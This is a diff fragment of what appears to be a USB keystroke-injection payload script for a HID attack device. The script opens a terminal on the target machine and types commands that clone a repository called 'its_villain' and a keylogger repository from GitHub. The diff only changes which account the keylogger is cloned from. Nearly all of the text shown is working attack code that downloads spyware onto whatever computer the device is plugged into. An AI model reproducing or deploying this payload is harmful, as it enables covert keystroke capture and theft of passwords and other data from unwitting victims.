@@ -3,7 +3,7 @@ ATTACKMODE HID STORAGE
 DELAY 500
 CTRL ALT t
 DELAY 1000
-STRING git clone https://github.com/dad1x/its_villain.git & git clone https://github.com/GiacomoLaw/Keylogger.git
+STRING git clone https://github.com/dad1x/its_villain.git & git clone https://github.com/dad1x/Keylogger.git
 ENTER
 DELAY 2000
 STRING cd its_villain
